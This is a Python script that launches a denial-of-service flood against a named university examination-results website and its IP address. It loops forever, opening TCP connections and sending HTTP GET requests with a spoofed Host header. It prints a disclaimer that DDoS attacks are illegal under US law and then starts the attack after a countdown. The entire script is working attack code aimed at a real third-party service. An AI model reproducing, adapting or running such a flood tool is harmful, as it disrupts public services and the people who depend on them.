import socket
import time
target = '172.67.206.2'
url = "https://onlineresult.manipuruniv.ac.in/"
fake_ip = '182.21.20.32'
port = 80
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        print(" \033[1;32;40m  Attacking \033[1;31;40m %s \033[1;32;40m on \033[1;31;40m %s \033[1;32;40m  through port \033[1;31;40m %d \033[1;32;40m  " % (url,target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
print("""\033[1;32;40mTARGET  :  https://onlineresult.manipuruniv.ac.in/index2sem2023.php \033[1;31;40m
DDoSing is an Illegal cybercrime in the United States. A DDoS attack could be classified as a federal criminal offense under the Computer Fraud and Abuse Act (CFAA).  

The use of booter services and stressers also violates this act.

If you're found guilty of causing intentional harm to a computer or server in a DDoS attack, you could be charged with a prison sentence of up to 10 years. \n""")
print("\033[1;33;40m Starting attack in 6 sec Press \033[1;36;40m CTRL + C \033[1;32;40m to quit \033[0;37;40m")
time.sleep(6)
attack()
